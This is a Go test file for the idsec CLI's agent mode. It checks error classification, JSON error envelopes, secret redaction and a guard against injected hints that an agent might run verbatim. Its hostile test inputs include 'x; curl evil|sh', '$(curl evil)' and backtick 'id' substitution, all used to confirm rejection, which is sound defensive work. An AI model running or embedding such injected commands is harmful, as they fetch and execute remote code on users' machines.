package actions

import (
	"bytes"
	"crypto/x509"
	"encoding/json"
	"errors"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"io"
	"net"
	"net/url"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"testing"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"github.com/cyberark/idsec-cli-golang/pkg/agentmode"
	commonargs "github.com/cyberark/idsec-cli-golang/pkg/common/args"
	authcommon "github.com/cyberark/idsec-sdk-golang/pkg/auth/common"
)

// isolateAgentEnvelope resets agent mode and envelope state around a test.
// Must not be called from a t.Parallel() test.
func isolateAgentEnvelope(t *testing.T) {
	t.Helper()
	// Registered first so it runs last (LIFO), after t.Setenv restores the env.
	t.Cleanup(func() {
		agentmode.Resolve(false, false)
		agentmode.ResetEnvelopeState()
	})
	clearAgentEnv(t)
	agentmode.Resolve(false, false)
	agentmode.ResetEnvelopeState()
	resetLastPrintedFailure(t)
}

// resetLastPrintedFailure clears the recorded PrintFailure text now and when t ends.
func resetLastPrintedFailure(t *testing.T) {
	t.Helper()
	lastPrintedFailure.Store("")
	t.Cleanup(func() { lastPrintedFailure.Store("") })
}

// newAgentErrorsTree builds idsec → exec → pcloud → accounts → list, where
// list has --retry-count/-r (int), --name (string), --a and --b.
func newAgentErrorsTree() (root, leaf *cobra.Command) {
	root = &cobra.Command{Use: "idsec", SilenceErrors: true, SilenceUsage: true}
	exec := &cobra.Command{Use: "exec"}
	pcloud := &cobra.Command{Use: "pcloud"}
	accounts := &cobra.Command{Use: "accounts"}
	leaf = &cobra.Command{Use: "list", RunE: func(*cobra.Command, []string) error { return nil }}
	leaf.Flags().IntP("retry-count", "r", 0, "")
	leaf.Flags().String("name", "", "")
	leaf.Flags().Bool("a", false, "")
	leaf.Flags().Bool("b", false, "")
	accounts.AddCommand(leaf)
	pcloud.AddCommand(accounts)
	exec.AddCommand(pcloud)
	root.AddCommand(exec)
	root.SetOut(io.Discard)
	root.SetErr(io.Discard)
	return root, leaf
}

func execute(root *cobra.Command, args ...string) error {
	root.SetArgs(args)
	return root.Execute()
}

func flagParseError(t *testing.T, leaf *cobra.Command, args ...string) error {
	t.Helper()
	err := leaf.ParseFlags(args)
	if err == nil {
		t.Fatalf("ParseFlags(%q) = nil, want error", args)
	}
	return err
}

func TestFlagError(t *testing.T) {
	const listPath = "idsec exec pcloud accounts list"
	tests := []struct {
		name       string
		args       []string
		wantText   string
		wantMsg    string
		wantKind   string
		wantFlag   string
		wantHints  []string
		textPrefix bool
	}{
		{
			name:      "success_unknown_long_flag",
			args:      []string{"--bogus"},
			wantText:  "unknown flag: --bogus",
			wantMsg:   "unknown flag: --bogus",
			wantKind:  agentmode.KindUnknownFlag,
			wantFlag:  "bogus",
			wantHints: []string{"run `idsec exec pcloud accounts list --help` to list flags"},
		},
		{
			name:      "success_unknown_long_flag_with_value",
			args:      []string{"--bogus=1"},
			wantText:  "unknown flag: --bogus",
			wantMsg:   "unknown flag: --bogus",
			wantKind:  agentmode.KindUnknownFlag,
			wantFlag:  "bogus",
			wantHints: []string{"run `idsec exec pcloud accounts list --help` to list flags"},
		},
		{
			name:      "success_unknown_shorthand",
			args:      []string{"-z"},
			wantText:  "unknown shorthand flag: 'z' in -z",
			wantMsg:   "unknown flag: -z",
			wantKind:  agentmode.KindUnknownFlag,
			wantFlag:  "z",
			wantHints: []string{"run `idsec exec pcloud accounts list --help` to list flags"},
		},
		{
			name:     "success_missing_value_long",
			args:     []string{"--retry-count"},
			wantText: "flag needs an argument: --retry-count",
			wantMsg:  "flag needs an argument: --retry-count",
			wantKind: agentmode.KindMissingValue,
			wantFlag: "retry-count",
		},
		{
			name:     "success_missing_value_shorthand_maps_to_long_name",
			args:     []string{"-r"},
			wantText: "flag needs an argument: 'r' in -r",
			wantMsg:  "flag needs an argument: --retry-count",
			wantKind: agentmode.KindMissingValue,
			wantFlag: "retry-count",
		},
		{
			name:       "success_invalid_value_equals",
			args:       []string{"--retry-count=abc"},
			wantText:   `invalid argument "abc" for "-r, --retry-count" flag: `,
			wantMsg:    "invalid argument for --retry-count",
			textPrefix: true,
			wantKind:   agentmode.KindInvalidValue,
			wantFlag:   "retry-count",
		},
		{
			name:       "success_invalid_value_shorthand",
			args:       []string{"-r", "abc"},
			wantText:   `invalid argument "abc" for "-r, --retry-count" flag: `,
			wantMsg:    "invalid argument for --retry-count",
			textPrefix: true,
			wantKind:   agentmode.KindInvalidValue,
			wantFlag:   "retry-count",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, leaf := newAgentErrorsTree()
			orig := flagParseError(t, leaf, tt.args...)

			got := FlagError(leaf, orig)

			if got.Error() != orig.Error() {
				t.Errorf("Error() = %q, want original %q", got.Error(), orig.Error())
			}
			if tt.textPrefix {
				if !strings.HasPrefix(orig.Error(), tt.wantText) {
					t.Errorf("pflag text = %q, want prefix %q (pflag reworded?)", orig.Error(), tt.wantText)
				}
			} else if orig.Error() != tt.wantText {
				t.Errorf("pflag text = %q, want %q (pflag reworded?)", orig.Error(), tt.wantText)
			}
			if !errors.Is(got, orig) {
				t.Error("FlagError result does not wrap the original error")
			}
			f := ClassifyError(got)
			if f.Code != agentmode.CodeInvalidInput {
				t.Errorf("Code = %q, want INVALID_INPUT", f.Code)
			}
			if f.Message != tt.wantMsg || !f.Redacted {
				t.Errorf("Message, Redacted = %q, %v; want %q, true", f.Message, f.Redacted, tt.wantMsg)
			}
			wantDetails := map[string]any{"kind": tt.wantKind, "flag": tt.wantFlag, "command": listPath}
			if !reflect.DeepEqual(f.Details, wantDetails) {
				t.Errorf("Details = %#v, want %#v", f.Details, wantDetails)
			}
			if !reflect.DeepEqual(f.Hints, tt.wantHints) {
				t.Errorf("Hints = %#v, want %#v", f.Hints, tt.wantHints)
			}
		})
	}
}

func TestFlagError_Edges(t *testing.T) {
	t.Run("success_help_passes_through", func(t *testing.T) {
		_, leaf := newAgentErrorsTree()
		if got := FlagError(leaf, pflag.ErrHelp); got != pflag.ErrHelp {
			t.Errorf("FlagError(ErrHelp) = %v, want pflag.ErrHelp", got)
		}
	})
	t.Run("success_nil_passes_through", func(t *testing.T) {
		if got := FlagError(nil, nil); got != nil {
			t.Errorf("FlagError(nil) = %v, want nil", got)
		}
	})
	t.Run("edge_case_unrecognized_text_is_invalid_input_without_kind", func(t *testing.T) {
		_, leaf := newAgentErrorsTree()
		f := ClassifyError(FlagError(leaf, errors.New("something new from pflag")))
		if f.Code != agentmode.CodeInvalidInput {
			t.Errorf("Code = %q, want INVALID_INPUT", f.Code)
		}
		if _, ok := f.Details["kind"]; ok {
			t.Errorf("Details = %#v, want no kind", f.Details)
		}
	})
	t.Run("success_inherited_flag_error_func", func(t *testing.T) {
		root, _ := newAgentErrorsTree()
		root.SetFlagErrorFunc(FlagError)
		err := execute(root, "exec", "pcloud", "accounts", "list", "--bogus")
		if !strings.Contains(err.Error(), "unknown flag") {
			t.Errorf("err = %q, want it to contain %q", err.Error(), "unknown flag")
		}
		if f := ClassifyError(err); f.Details["command"] != "idsec exec pcloud accounts list" || f.Details["kind"] != agentmode.KindUnknownFlag {
			t.Errorf("Details = %#v", f.Details)
		}
	})
	t.Run("success_hostile_flag_name_stays_out_of_details_and_hints", func(t *testing.T) {
		_, leaf := newAgentErrorsTree()
		f := ClassifyError(FlagError(leaf, flagParseError(t, leaf, "--$(touch-x)")))
		if _, ok := f.Details["flag"]; ok {
			t.Errorf("flag = %#v, want omitted for a name that isn't flag-shaped", f.Details["flag"])
		}
		if f.Message != "unknown flag or bad flag syntax" {
			t.Errorf("Message = %q", f.Message)
		}
		for _, h := range f.Hints {
			if strings.Contains(h, "touch-x") {
				t.Errorf("hint %q contains user input", h)
			}
		}
	})
}

func TestClassifyError(t *testing.T) {
	opErr := &net.OpError{Op: "dial", Net: "tcp", Err: errors.New("connection refused")}
	urlErr := &url.Error{Op: "Get", URL: "https://tenant.example", Err: opErr}

	tests := []struct {
		name        string
		err         func(t *testing.T) error
		wantCode    agentmode.Code
		wantMessage string
		wantDetails map[string]any
		wantHints   []string
	}{
		{
			name: "success_cobra_required_flag",
			err: func(t *testing.T) error {
				root, leaf := newAgentErrorsTree()
				_ = leaf.MarkFlagRequired("name")
				return execute(root, "exec", "pcloud", "accounts", "list")
			},
			wantCode:    agentmode.CodeMissingRequiredInput,
			wantMessage: `required flag(s) "name" not set`,
			wantDetails: map[string]any{"missing_flags": []string{"name"}},
			wantHints:   []string{"agent mode never prompts; pass --name"},
		},
		{
			name: "success_cobra_two_required_flags",
			err: func(t *testing.T) error {
				root, leaf := newAgentErrorsTree()
				_ = leaf.MarkFlagRequired("a")
				_ = leaf.MarkFlagRequired("b")
				return execute(root, "exec", "pcloud", "accounts", "list")
			},
			wantCode:    agentmode.CodeMissingRequiredInput,
			wantMessage: `required flag(s) "a", "b" not set`,
			wantDetails: map[string]any{"missing_flags": []string{"a", "b"}},
			wantHints:   []string{"agent mode never prompts; pass --a", "agent mode never prompts; pass --b"},
		},
		{
			name: "success_cobra_unknown_command",
			err: func(t *testing.T) error {
				root, _ := newAgentErrorsTree()
				return execute(root, "nosuch")
			},
			wantCode:    agentmode.CodeUnknownCommand,
			wantMessage: `unknown command "nosuch" for "idsec"`,
			wantDetails: map[string]any{"kind": agentmode.KindUnknownCommand, "token": "nosuch", "parent": "idsec"},
			wantHints:   []string{"run `idsec --help` to list available commands"},
		},
		{
			name: "success_cobra_unknown_command_with_suggestion",
			err: func(t *testing.T) error {
				root, _ := newAgentErrorsTree()
				return execute(root, "exce")
			},
			wantCode:    agentmode.CodeUnknownCommand,
			wantMessage: "unknown command \"exce\" for \"idsec\"\n\nDid you mean this?\n\texec\n",
			wantDetails: map[string]any{"kind": agentmode.KindUnknownCommand, "token": "exce", "parent": "idsec"},
			wantHints:   []string{"run `idsec --help` to list available commands"},
		},
		{
			name: "success_cobra_no_args_unknown_command",
			err: func(t *testing.T) error {
				root, _ := newAgentErrorsTree()
				root.Args = cobra.NoArgs
				root.RunE = func(*cobra.Command, []string) error { return nil }
				return execute(root, "nosuch")
			},
			wantCode:    agentmode.CodeUnknownCommand,
			wantMessage: `unknown command "nosuch" for "idsec"`,
			wantDetails: map[string]any{"kind": agentmode.KindUnknownCommand, "token": "nosuch", "parent": "idsec"},
			wantHints:   []string{"run `idsec --help` to list available commands"},
		},
		{
			name: "success_cobra_mutually_exclusive_flags",
			err: func(t *testing.T) error {
				root, leaf := newAgentErrorsTree()
				leaf.MarkFlagsMutuallyExclusive("a", "b")
				return execute(root, "exec", "pcloud", "accounts", "list", "--a", "--b")
			},
			wantCode:    agentmode.CodeInvalidInput,
			wantMessage: "if any flags in the group [a b] are set none of the others can be; [a b] were all set",
			wantDetails: map[string]any{"kind": agentmode.KindFlagConflict, "flags": []string{"a", "b"}},
		},
		{
			name: "success_cobra_required_together_flags",
			err: func(t *testing.T) error {
				root, leaf := newAgentErrorsTree()
				leaf.MarkFlagsRequiredTogether("a", "b")
				return execute(root, "exec", "pcloud", "accounts", "list", "--a")
			},
			wantCode:    agentmode.CodeInvalidInput,
			wantMessage: "if any flags in the group [a b] are set they must all be set; missing [b]",
			wantDetails: map[string]any{"kind": agentmode.KindFlagConflict, "flags": []string{"a", "b"}},
		},
		{
			name: "success_cobra_one_required_flag_group",
			err: func(t *testing.T) error {
				root, leaf := newAgentErrorsTree()
				leaf.MarkFlagsOneRequired("a", "b")
				return execute(root, "exec", "pcloud", "accounts", "list")
			},
			wantCode:    agentmode.CodeInvalidInput,
			wantMessage: "at least one of the flags in the group [a b] is required",
			wantDetails: map[string]any{"kind": agentmode.KindFlagConflict, "flags": []string{"a", "b"}},
		},
		{
			name: "success_wrapped_missing_required_input_error",
			err: func(t *testing.T) error {
				return fmt.Errorf("p: %w", commonargs.NewMissingRequiredInputError("yes"))
			},
			wantCode:    agentmode.CodeMissingRequiredInput,
			wantMessage: "p: flag --yes is required but was not provided",
			wantDetails: map[string]any{"missing_flags": []string{"yes"}},
			wantHints:   []string{"agent mode never prompts; pass --yes"},
		},
		{
			name:        "success_keyring_sentinel",
			err:         func(t *testing.T) error { return fmt.Errorf("x: %w", authcommon.ErrKeyringFailure) },
			wantCode:    agentmode.CodeKeyringFailure,
			wantMessage: "x: token cache (keyring) operation failed",
			wantHints:   []string{hintKeyringFailure},
		},
		{
			name:        "success_url_net_error",
			err:         func(t *testing.T) error { return urlErr },
			wantCode:    agentmode.CodeEndpointUnreachable,
			wantMessage: urlErr.Error(),
			wantHints:   []string{hintEndpointUnreachable},
		},
		{
			name:        "success_x509_unknown_authority",
			err:         func(t *testing.T) error { return x509.UnknownAuthorityError{} },
			wantCode:    agentmode.CodeCertificateError,
			wantMessage: x509.UnknownAuthorityError{}.Error(),
			wantHints:   []string{hintCertificateError},
		},
		{
			name:        "success_mfa_sentinel",
			err:         func(t *testing.T) error { return fmt.Errorf("login: %w", authcommon.ErrMFARequired) },
			wantCode:    agentmode.CodeMFARequired,
			wantMessage: "login: " + authcommon.ErrMFARequired.Error(),
			wantHints:   []string{hintMFARequired},
		},
		{
			name: "success_failure_wrapping_url_error_stays_invalid_input",
			err: func(t *testing.T) error {
				return agentmode.NewFailure(agentmode.CodeInvalidInput, urlErr, agentmode.WithDetail("kind", agentmode.KindValidation))
			},
			wantCode:    agentmode.CodeInvalidInput,
			wantMessage: urlErr.Error(),
			wantDetails: map[string]any{"kind": agentmode.KindValidation},
		},
		{
			name:        "success_bare_action_failed",
			err:         func(t *testing.T) error { return ErrActionFailed },
			wantCode:    agentmode.CodeActionFailed,
			wantMessage: "command failed; see stderr for details",
		},
		{
			name:        "success_bare_exit_code_4",
			err:         func(t *testing.T) error { return &ExitCodeError{Code: 4} },
			wantCode:    agentmode.CodeActionFailed,
			wantMessage: "command failed; see stderr for details",
		},
		{
			name:        "success_plain_error",
			err:         func(t *testing.T) error { return errors.New("boom") },
			wantCode:    agentmode.CodeActionFailed,
			wantMessage: "boom",
		},
		{
			name:        "edge_case_empty_error_text",
			err:         func(t *testing.T) error { return errors.New("") },
			wantCode:    agentmode.CodeActionFailed,
			wantMessage: "command failed; see stderr for details",
		},
		{
			name:        "edge_case_nil",
			err:         func(t *testing.T) error { return nil },
			wantCode:    agentmode.CodeActionFailed,
			wantMessage: "command failed; see stderr for details",
		},
		{
			name: "success_default_hints_for_failure_without_hints",
			err: func(t *testing.T) error {
				return agentmode.NewFailure(agentmode.CodeProfileNotFound, errors.New("Please configure a profile before trying to execute actions"),
					agentmode.WithDetail("profile", "nosuch"))
			},
			wantCode:    agentmode.CodeProfileNotFound,
			wantMessage: "Please configure a profile before trying to execute actions",
			wantDetails: map[string]any{"profile": "nosuch"},
			wantHints:   []string{hintProfilesList, hintProfileCreate},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			resetLastPrintedFailure(t)
			err := tt.err(t)
			if tt.name != "edge_case_nil" && err == nil {
				t.Fatal("setup produced a nil error")
			}

			f := ClassifyError(err)

			if f.Code != tt.wantCode {
				t.Errorf("Code = %q, want %q", f.Code, tt.wantCode)
			}
			if f.Message != tt.wantMessage {
				t.Errorf("Message = %q, want %q", f.Message, tt.wantMessage)
			}
			if len(f.Details) != len(tt.wantDetails) || (len(tt.wantDetails) > 0 && !reflect.DeepEqual(f.Details, tt.wantDetails)) {
				t.Errorf("Details = %#v, want %#v", f.Details, tt.wantDetails)
			}
			if !reflect.DeepEqual(f.Hints, tt.wantHints) {
				t.Errorf("Hints = %#v, want %#v", f.Hints, tt.wantHints)
			}
		})
	}
}

func TestClassifyError_PassesThroughReportedFailure(t *testing.T) {
	var err error
	_ = withCapturedStderr(func() { err = missingFlagFailure("--profile-path is required", "profile-path") })
	var exitErr *ExitCodeError
	if !errors.As(err, &exitErr) {
		t.Fatalf("missingFlagFailure() = %#v", err)
	}
	if got := ClassifyError(err); got != exitErr.Failure {
		t.Errorf("ClassifyError() = %#v, want the carried Failure unchanged", got)
	}
}

func TestClassifyError_DefaultHintsDoNotMutateFailure(t *testing.T) {
	f := agentmode.NewFailure(agentmode.CodeKeyringFailure, errors.New("x"))
	got := ClassifyError(f)
	if len(got.Hints) != 1 || f.Hints != nil {
		t.Errorf("ClassifyError hints = %#v, original hints = %#v", got.Hints, f.Hints)
	}
}

func TestClassifyError_LastFailureMessageHook(t *testing.T) {
	prev := lastFailureMessage
	t.Cleanup(func() { lastFailureMessage = prev })

	lastFailureMessage = func() string { return "Failed to clear profiles: x" }
	if got := ClassifyError(ErrActionFailed); got.Message != "Failed to clear profiles: x" || got.Code != agentmode.CodeActionFailed {
		t.Errorf("ClassifyError() = %#v", got)
	}

	lastFailureMessage = func() string { return "" }
	if got := ClassifyError(ErrActionFailed).Message; got != fallbackFailureMessage {
		t.Errorf("Message = %q, want fallback", got)
	}
}

func TestWriteErrorEnvelope_LastPrintedFailureMessage(t *testing.T) {
	isolateAgentEnvelope(t)
	agentmode.Resolve(true, false)

	stderr := withCapturedStderr(func() { commonargs.PrintFailure("Failed to clear profiles: x") })
	var buf bytes.Buffer
	WriteErrorEnvelope(&buf, ErrActionFailed)

	if stderr != "Failed to clear profiles: x\n" {
		t.Errorf("stderr = %q", stderr)
	}
	want := "{\"status\":\"error\",\"error\":{\"code\":\"ACTION_FAILED\",\"message\":\"Failed to clear profiles: x\"}}\n"
	if buf.String() != want {
		t.Errorf("envelope =\n%s\nwant\n%s", buf.String(), want)
	}
}

func TestClassifiedOr(t *testing.T) {
	tests := []struct {
		name string
		err  error
		want agentmode.Code
	}{
		{"success_wrapped_failure", fmt.Errorf("x: %w", agentmode.NewFailure(agentmode.CodeInvalidInput, errors.New("q"))), agentmode.CodeInvalidInput},
		{"success_classified", fmt.Errorf("x: %w", authcommon.ErrKeyringFailure), agentmode.CodeKeyringFailure},
		{"success_fallback", errors.New("boom"), agentmode.CodeInternalError},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := classifiedOr(tt.err, agentmode.CodeInternalError); got != tt.want {
				t.Errorf("classifiedOr() = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestWriteErrorEnvelope(t *testing.T) {
	t.Run("success_golden_unknown_flag", func(t *testing.T) {
		isolateAgentEnvelope(t)
		agentmode.Resolve(true, false)
		_, leaf := newAgentErrorsTree()
		err := FlagError(leaf, flagParseError(t, leaf, "--pagesize"))

		var buf bytes.Buffer
		WriteErrorEnvelope(&buf, err)

		want := "{\"status\":\"error\",\"error\":{\"code\":\"INVALID_INPUT\",\"message\":\"unknown flag: --pagesize\",\"details\":{\"command\":\"idsec exec pcloud accounts list\",\"flag\":\"pagesize\",\"kind\":\"unknown_flag\"}},\"hints\":[\"run `idsec exec pcloud accounts list --help` to list flags\"]}\n"
		if buf.String() != want {
			t.Errorf("envelope =\n%s\nwant\n%s", buf.String(), want)
		}
	})

	t.Run("success_called_twice_writes_one_line", func(t *testing.T) {
		isolateAgentEnvelope(t)
		agentmode.Resolve(true, false)

		var buf bytes.Buffer
		WriteErrorEnvelope(&buf, errors.New("first"))
		WriteErrorEnvelope(&buf, errors.New("second"))

		if n := strings.Count(buf.String(), "\n"); n != 1 {
			t.Fatalf("wrote %d lines, want 1: %q", n, buf.String())
		}
		var env agentmode.Envelope
		if err := json.Unmarshal(buf.Bytes(), &env); err != nil {
			t.Fatalf("unmarshal: %v", err)
		}
		if env.Status != agentmode.StatusError || env.Error.Message != "first" {
			t.Errorf("envelope = %#v", env)
		}
	})
}

// TestAgentHints_InjectionGuard: an agent may run a hint verbatim, so every
// hint in non-test code must be a plain string constant named hint*, or come
// from a *Hint template function that splices in CLI constants only.
func TestAgentHints_InjectionGuard(t *testing.T) {
	files, err := filepath.Glob("*.go")
	if err != nil {
		t.Fatal(err)
	}
	fset := token.NewFileSet()
	hintConsts := map[string]string{}
	templateFuncs := map[string]bool{}
	var parsed []*ast.File
	for _, name := range files {
		if strings.HasSuffix(name, "_test.go") {
			continue
		}
		file, err := parser.ParseFile(fset, name, nil, 0)
		if err != nil {
			t.Fatalf("parse %s: %v", name, err)
		}
		parsed = append(parsed, file)
		for _, decl := range file.Decls {
			switch d := decl.(type) {
			case *ast.FuncDecl:
				if d.Recv == nil && strings.HasSuffix(d.Name.Name, "Hint") {
					templateFuncs[d.Name.Name] = true
				}
			case *ast.GenDecl:
				if d.Tok != token.CONST {
					continue
				}
				for _, spec := range d.Specs {
					vs := spec.(*ast.ValueSpec)
					for i, id := range vs.Names {
						if !strings.HasPrefix(id.Name, "hint") {
							continue
						}
						lit, ok := vs.Values[i].(*ast.BasicLit)
						if !ok || lit.Kind != token.STRING {
							t.Errorf("%s: %s is not a plain string literal", fset.Position(id.Pos()), id.Name)
							continue
						}
						v, _ := strconv.Unquote(lit.Value)
						hintConsts[id.Name] = v
					}
				}
			}
		}
	}
	if len(hintConsts) == 0 {
		t.Fatal("found no hint constants")
	}
	for name, v := range hintConsts {
		if strings.Contains(v, "%") {
			t.Errorf("%s contains a %% verb: %q", name, v)
		}
		if strings.Contains(v, "idsec schema") {
			t.Errorf("%s mentions the nonexistent `idsec schema`: %q", name, v)
		}
	}

	allowedArg := func(e ast.Expr) bool {
		switch a := e.(type) {
		case *ast.Ident:
			_, ok := hintConsts[a.Name]
			return ok
		case *ast.CallExpr:
			fn, ok := a.Fun.(*ast.Ident)
			return ok && templateFuncs[fn.Name]
		}
		return false
	}
	for _, file := range parsed {
		ast.Inspect(file, func(n ast.Node) bool {
			call, ok := n.(*ast.CallExpr)
			if !ok {
				return true
			}
			sel, ok := call.Fun.(*ast.SelectorExpr)
			if !ok || sel.Sel.Name != "WithHint" || len(call.Args) != 1 {
				return true
			}
			if !allowedArg(call.Args[0]) {
				t.Errorf("%s: WithHint argument is not a hint constant or *Hint template", fset.Position(call.Pos()))
			}
			return true
		})
	}

	for code, hints := range defaultHints {
		for _, h := range hints {
			found := false
			for _, v := range hintConsts {
				found = found || v == h
			}
			if !found {
				t.Errorf("defaultHints[%s] has %q, which is not a hint constant", code, h)
			}
		}
	}
}

func TestFlagError_BadFlagSyntax(t *testing.T) {
	const listPath = "idsec exec pcloud accounts list"
	for _, tc := range []struct {
		arg       string
		wantFlag  any
		wantHints []string
	}{
		{arg: "---x", wantFlag: "x", wantHints: []string{listFlagsHint(listPath)}},
		{arg: "--=x", wantFlag: nil, wantHints: []string{listFlagsHint(listPath)}},
	} {
		t.Run(tc.arg, func(t *testing.T) {
			isolateAgentEnvelope(t)
			_, leaf := newAgentErrorsTree()
			parseErr := flagParseError(t, leaf, tc.arg)

			var f *agentmode.Failure
			if !errors.As(FlagError(leaf, parseErr), &f) {
				t.Fatalf("FlagError did not return a Failure")
			}

			if f.Code != agentmode.CodeInvalidInput || f.Details["kind"] != agentmode.KindUnknownFlag {
				t.Errorf("code, kind = %s, %v; want INVALID_INPUT, unknown_flag", f.Code, f.Details["kind"])
			}
			if f.Details["flag"] != tc.wantFlag {
				t.Errorf("flag = %v, want %v", f.Details["flag"], tc.wantFlag)
			}
			if !reflect.DeepEqual(f.Hints, tc.wantHints) {
				t.Errorf("hints = %q, want %q", f.Hints, tc.wantHints)
			}
			if f.Error() != parseErr.Error() {
				t.Errorf("message = %q, want pflag text %q", f.Error(), parseErr.Error())
			}
		})
	}
}

// leakSecret stands in for a secret typed into argv, an --arg binding or query input.
const leakSecret = "S3CRET-tok"

// assertEnvelopeOmits fails when the envelope for err contains leakSecret,
// and when stderrText (the human text printed for err) does not.
func assertEnvelopeOmits(t *testing.T, err error, stderrText, wantMsg string) {
	t.Helper()
	if !strings.Contains(stderrText, leakSecret) {
		t.Fatalf("stderr text = %q, want the full text (with the value) kept for stderr", stderrText)
	}
	var buf bytes.Buffer
	if werr := agentmode.Write(&buf, agentmode.NewErrorEnvelope(ClassifyError(err))); werr != nil {
		t.Fatalf("Write: %v", werr)
	}
	if strings.Contains(buf.String(), leakSecret) {
		t.Errorf("envelope leaks the value: %s", buf.String())
	}
	if f := ClassifyError(err); f.Message != wantMsg {
		t.Errorf("Message = %q, want %q", f.Message, wantMsg)
	}
}

func TestFlagError_EnvelopeMessageOmitsArgv(t *testing.T) {
	for _, tc := range []struct {
		name    string
		args    []string
		wantMsg string
	}{
		{name: "invalid_value", args: []string{"--retry-count=" + leakSecret}, wantMsg: "invalid argument for --retry-count"},
		{name: "invalid_value_shorthand", args: []string{"-r", leakSecret}, wantMsg: "invalid argument for --retry-count"},
		{name: "unknown_shorthand_in_token", args: []string{"-z" + leakSecret}, wantMsg: "unknown flag: -z"},
		{name: "unknown_flag_name_is_secret", args: []string{"--" + leakSecret + "=x"}, wantMsg: "unknown flag or bad flag syntax"},
		{name: "bad_flag_syntax", args: []string{"---" + leakSecret}, wantMsg: "unknown flag or bad flag syntax"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			isolateAgentEnvelope(t)
			_, leaf := newAgentErrorsTree()
			err := FlagError(leaf, flagParseError(t, leaf, tc.args...))
			assertEnvelopeOmits(t, err, err.Error(), tc.wantMsg)
		})
	}
}

func TestQueryFailures_EnvelopeMessageOmitsValues(t *testing.T) {
	isolateAgentEnvelope(t)
	_, argErr := parseQueryVars([]string{"api token=" + leakSecret}, nil)
	_, argjsonErr := parseQueryVars(nil, []string{"bad name=" + leakSecret})
	runErr := applyGojqQuery(map[string]any{"token": leakSecret}, ".token | keys", false)
	parseErr := applyGojqQuery(nil, `.["`+leakSecret, false)
	if argErr == nil || argjsonErr == nil || runErr == nil || parseErr == nil {
		t.Fatalf("want every input to fail: %v, %v, %v, %v", argErr, argjsonErr, runErr, parseErr)
	}
	execMsg := "Failed to execute action: " + runErr.Error()

	for _, tc := range []struct {
		name       string
		err        error
		stderrText string
		wantMsg    string
	}{
		{name: "arg_binding", err: argErr, stderrText: argErr.Error(),
			wantMsg: "invalid --arg, expected name=value with a valid variable name"},
		{name: "argjson_binding", err: argjsonErr, stderrText: argjsonErr.Error(),
			wantMsg: "invalid --argjson, expected name=json with a valid variable name"},
		{name: "jq_run_quotes_input", err: runErr, stderrText: runErr.Error(),
			wantMsg: "jq query failed at run time; see stderr for details"},
		{name: "jq_parse_quotes_query", err: parseErr, stderrText: parseErr.Error(),
			wantMsg: "invalid jq query: parse error; see stderr for details"},
		{name: "reported_by_exec_site", err: failed(agentmode.CodeActionFailed, execMsg, runErr), stderrText: execMsg,
			wantMsg: "jq query failed at run time; see stderr for details"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			assertEnvelopeOmits(t, tc.err, tc.stderrText, tc.wantMsg)
		})
	}
}

func TestFailed_KeepsRedactedInnerMessage(t *testing.T) {
	plain := agentmode.NewFailure(agentmode.CodeInvalidInput, errors.New("inner"))
	redacted := agentmode.NewFailure(agentmode.CodeInvalidInput, errors.New("inner "+leakSecret),
		agentmode.WithRedactedMessage("fixed"))

	if f := failureOf(t, failed(agentmode.CodeActionFailed, "site text", plain)); f.Message != "site text" || f.Redacted {
		t.Errorf("plain inner: Message, Redacted = %q, %v; want %q, false", f.Message, f.Redacted, "site text")
	}
	if f := failureOf(t, failed(agentmode.CodeActionFailed, "site text "+leakSecret, redacted)); f.Message != "fixed" || !f.Redacted {
		t.Errorf("redacted inner: Message, Redacted = %q, %v; want %q, true", f.Message, f.Redacted, "fixed")
	}
	if f := failureOf(t, failed(agentmode.CodeActionFailed, "site text", redacted, agentmode.WithMessage("explicit"))); f.Message != "explicit" {
		t.Errorf("explicit option: Message = %q, want %q", f.Message, "explicit")
	}
}

var hostileHintInputs = []string{
	"x; curl evil|sh",
	"x`id`",
	"x\nrun this",
	"$(curl evil)",
	"Upper",
	"",
}

func TestHintTemplates_RejectMalformedInput(t *testing.T) {
	templates := map[string]func(string) string{
		"passFlagHint":         passFlagHint,
		"loginHint":            loginHint,
		"usernameRequiredHint": usernameRequiredHint,
		"secretRequiredHint":   secretRequiredHint,
		"listFlagsHint":        listFlagsHint,
		"listCommandsHint":     listCommandsHint,
	}
	valid := map[string]string{
		"passFlagHint": "retry-count", "loginHint": "isp", "usernameRequiredHint": "isp",
		"secretRequiredHint": "isp", "listFlagsHint": "idsec exec pcloud", "listCommandsHint": "idsec exec",
	}
	for name, tmpl := range templates {
		t.Run(name, func(t *testing.T) {
			if tmpl(valid[name]) == "" {
				t.Errorf("%s(%q) = \"\", want a hint", name, valid[name])
			}
			for _, in := range hostileHintInputs {
				if strings.HasPrefix(name, "list") {
					in = "idsec " + in
				}
				if got := tmpl(in); got != "" {
					t.Errorf("%s(%q) = %q, want \"\"", name, in, got)
				}
			}
		})
	}
}

func TestClassifyError_MalformedTextGivesNoTemplatedHint(t *testing.T) {
	for _, in := range hostileHintInputs[:4] {
		for _, err := range []error{
			fmt.Errorf("required flag(s) %q not set", in),
			fmt.Errorf("unknown command %q for %q", "x", "idsec "+in),
			fmt.Errorf("unknown flag: --%s", in),
		} {
			t.Run(fmt.Sprintf("%q", err.Error()), func(t *testing.T) {
				f := ClassifyError(err)

				for _, h := range f.Hints {
					if h == "" || strings.ContainsAny(h, "`$;|\n") || strings.Contains(h, "curl") {
						t.Errorf("hint %q carries error text", h)
					}
				}
			})
		}
	}
}

func TestNotAuthenticatedOptions_MalformedKeyGivesNoLoginHint(t *testing.T) {
	f := agentmode.NewFailure(agentmode.CodeNotAuthenticated, errors.New("x"),
		notAuthenticatedOptions("p", map[string]string{"x; curl evil|sh": authStateNotAuthenticated, "isp": authStateNotAuthenticated})...)

	if !reflect.DeepEqual(f.Hints, []string{loginHint("isp")}) {
		t.Errorf("hints = %q, want only the isp login hint", f.Hints)
	}
}
